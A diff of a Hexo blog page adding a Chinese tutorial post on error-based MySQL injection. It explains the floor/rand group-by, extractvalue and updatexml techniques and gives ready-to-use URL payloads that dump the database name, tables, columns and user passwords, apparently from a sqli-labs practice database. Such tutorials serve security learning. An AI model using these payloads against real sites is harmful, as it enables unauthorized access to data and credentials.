@@ -145,6 +145,149 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2022/11/13/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="竹云">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Welcome To QYZY's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/11/13/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL注入之报错注入</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-11-13 21:57:33 / 修改时间：21:58:32" itemprop="dateCreated datePublished" datetime="2022-11-13T21:57:33+08:00">2022-11-13</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用，首选报错注入。</p>
+<p>报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。</p>
+<p>推荐三种报错注入的方法，直接套用就行。</p>
+<h2 id="1-group-by-重复键冲"><a href="#1-group-by-重复键冲" class="headerlink" title="1. group by 重复键冲"></a>1. group by 重复键冲</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>利用select count(*),floor(rand(0)*2)x from information_schema.character_sets group by x;导致数据库报错，通过concat函数连接注入语句与floor(rand(0)*2)函数，实现将注入结果与报错信息回显的注入方式。</p>
+<ul>
+<li>rand()函数<br>rand()可以产生一个在0和1之间的随机数<br>直接使用rand函数每次产生的数值不一样，但当我们提供了一个固定的随机数的种子0之后，每次产生的值都是相同的，这也可以称之为伪随机。</li>
+<li>floor (rand(0)<em>2)函数<br>floor函数的作用就是返回小于等于括号内该值的最大整数。<br>rand()本身是返回0~1的随机数，但在后面</em>2就变成了返回0~2之间的随机数。<br>配合上floor函数就可以产生确定的两个数，即0和1。<br>并且结合固定的随机数种子0，它每次产生的随机数列都是相同的值。</li>
+<li>group by 函数<br>group by 函数，作用就是分类汇总<br>在id 和 name后分别放入a x，意思就是id显示为a name显示为x<br>然后使用group by 函数进行分组，并且按照x（name）进行排序。</li>
+<li>count(<em>)函数<br>count（</em>）函数作用为统计结果的记录数</li>
+<li>综合使用产生报错<br><code>select count(*),floor(rand(0)*2) x from czs group by x;</code><br>当count（*）和group by x同时执行时，就会爆出duplicate entry错误。</li>
+<li>报错原因解析<br>通过 floor 报错的方法来爆数据的本质是 group by 语句的报错。group by 语句报错的原因是 floor(random(0)*2)的不确定性，即可能为 0 也可能为 1<br>group by key 执行时循环读取数据的每一行，将结果保存于临时表中。读取每一行的 key 时，<br>如果 key 存在于临时表中，则更新临时表中的数据（更新数据时，不再计算 rand 值）；如果<br>该 key 不存在于临时表中，则在临时表中插入 key 所在行的数据。（插入数据时，会再计算<br>rand 值）<br>如果此时临时表只有 key 为 1 的行不存在 key 为 0 的行，那么数据库要将该条记录插入临<br>时表，由于是随机数，插时又要计算一下随机值，此时 floor(random(0)*2)结果可能为 1，就<br>会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值<br>实际测试中发现，出现报错，至少要求数据记录为 3 行，记录数超过 3 行一定会报错，2 行<br>时是不报错的。</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> 查询的内容 <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>提交如下，获取数据库名字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select 1 from (select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) --+</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-extractvalue-函数"><a href="#2-extractvalue-函数" class="headerlink" title="2. extractvalue() 函数"></a>2. extractvalue() 函数</h2><blockquote>
+<ul>
+<li>此函数从目标XML中返回包含所查询值的字符串 语法：extractvalue（XML_document，xpath_string） 第一个参数：string格式，为XML文档对象的名称 第二个参数：xpath_string（xpath格式的字符串） select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>extractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>select user,password from users where user_id=1 and (extractvalue(1,0x7e));</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。</li>
+</ul>
+</blockquote>
+<p><code>?id=1&#39; and extractvalue(1,concat(&#39;^&#39;,(select database()),&#39;^&#39;)) --+</code><br>  获取数据库名字</p>
+<h2 id="3-updatexml-函数"><a href="#3-updatexml-函数" class="headerlink" title="3. updatexml() 函数"></a>3. updatexml() 函数</h2><blockquote>
+<ul>
+<li>updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>作用：改变文档中符合条件的节点的值</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>例如： select * from test where id = 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</li>
+</ul>
+</blockquote>
+<blockquote>
+<p><strong>另外，updatexml最多只能显示32位，需要配合SUBSTR使用。</strong></p>
+</blockquote>
+<blockquote>
+<p><code>substr(string $string, int $offset, int $length = null): string</code></p>
+</blockquote>
+<blockquote>
+<p>如果 offset 是非负数，返回的字符串将从 string 的 offset 位置开始，从 0 开始计算</p>
+</blockquote>
+<blockquote>
+<p>如果 offset 是负数，返回的字符串将从 string 结尾处向前数第 offset 个字符开始。</p>
+</blockquote>
+<blockquote>
+<p>如果 string 的长度小于 offset，将返回空字符串。</p>
+</blockquote>
+<blockquote>
+<p>如果提供了正数的 length，返回的字符串将从 offset 处开始最多包括 length 个字符（取决于 string 的长度）。<br>如果提供了负数的 length，那么 string 末尾处的 length 个字符将会被省略（若 offset 是负数则从字符串尾部算起）。如果 offset 不在这段文本中，那么将返回空字符串。<br>如果提供了值为 0 的 length，那么将返回一个空字符串。<br>如果没有提供 length，返回的子字符串将从 offset 位置开始直到字符串结尾。</p>
+</blockquote>
+<p><code>and updatexml(1,concat(&#39;^&#39;,(需要查询的内容),&#39;^&#39;),1)</code></p>
+<h3 id="1-提交如下，获取数据库名字"><a href="#1-提交如下，获取数据库名字" class="headerlink" title="1. 提交如下，获取数据库名字"></a>1. 提交如下，获取数据库名字</h3><p><code>?id=1&#39; and updatexml(1,concat(&#39;^&#39;,(database()),&#39;^&#39;),1) --+</code></p>
+<h3 id="2-获取当前数据库中表的名字"><a href="#2-获取当前数据库中表的名字" class="headerlink" title="2. 获取当前数据库中表的名字"></a>2. 获取当前数据库中表的名字</h3><p><del><code>?id=1&#39; and updatexml(1,concat(&#39;^&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; ),&#39;^&#39;),1) --+</code><br>这里是说要显示的内容超过一行它不能显示那么多，所以在 table_schema=’security’ 后加上 limit 0,1，显示第一行（显示第0行的往下一行，不包括第0行）<br>如果要看第二行则，limit1,1（第一行的往下一行，不包括第一行，即显示第二行），看第三行则limit2,1。以这个方法获取第四个表为users</del><br>使用<code>?id=1&#39;and updatexml(1,substr(concat(&#39;^&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),&#39;^&#39;),1,32),3) --+</code>可有效解决长度显示问题</p>
+<h3 id="3-爆表中的字段"><a href="#3-爆表中的字段" class="headerlink" title="3. 爆表中的字段"></a>3. 爆表中的字段</h3><p><code>?id=1&#39; and updatexml(1,concat(&#39;^&#39;,(select column_name from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39; limit 0,1 ),&#39;^&#39;),1) --+</code><br>总共爆出的字段为： id , username , password</p>
+<h3 id="4-爆字段中的内容"><a href="#4-爆字段中的内容" class="headerlink" title="4. 爆字段中的内容"></a>4. 爆字段中的内容</h3><p><code>?id=1&#39; and updatexml(1,concat(&#39;^&#39;,(select group_concat(username,&quot;--&quot;,password) from users limit 0,1 ),&#39;^&#39;),1) --+</code><br>三组用户名和密码。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2022/11/12/PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -826,7 +969,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-count">6</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
